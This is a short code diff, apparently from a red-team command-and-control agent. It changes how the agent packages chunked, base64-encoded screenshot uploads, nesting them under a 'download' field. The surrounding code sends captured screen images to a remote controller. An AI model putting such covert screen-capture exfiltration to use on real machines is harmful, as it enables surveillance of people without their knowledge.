@@ -75,11 +75,13 @@
             init_resp = self.postMessageAndRetrieveResponse({
                 "action": "post_response",
                 "responses": [{
-                    "task_id":       task_id,
-                    "total_chunks":  total_chunks,
-                    "file_path":     "screenshot_{}.png".format(ts),
-                    "chunk_size":    CHUNK_SIZE,
-                    "is_screenshot": True
+                    "task_id": task_id,
+                    "download": {
+                        "total_chunks":  total_chunks,
+                        "full_path":     "screenshot_{}.png".format(ts),
+                        "chunk_size":    CHUNK_SIZE,
+                        "is_screenshot": True
+                    }
                 }]
             })
 
@@ -100,10 +102,12 @@
                 self.postMessageAndRetrieveResponse({
                     "action": "post_response",
                     "responses": [{
-                        "task_id":    task_id,
-                        "chunk_num":  i + 1,
-                        "file_id":    file_id,
-                        "chunk_data": base64.b64encode(sh_data[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]).decode()
+                        "task_id": task_id,
+                        "download": {
+                            "chunk_num":  i + 1,
+                            "file_id":    file_id,
+                            "chunk_data": base64.b64encode(sh_data[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]).decode()
+                        }
                     }]
                 })
 
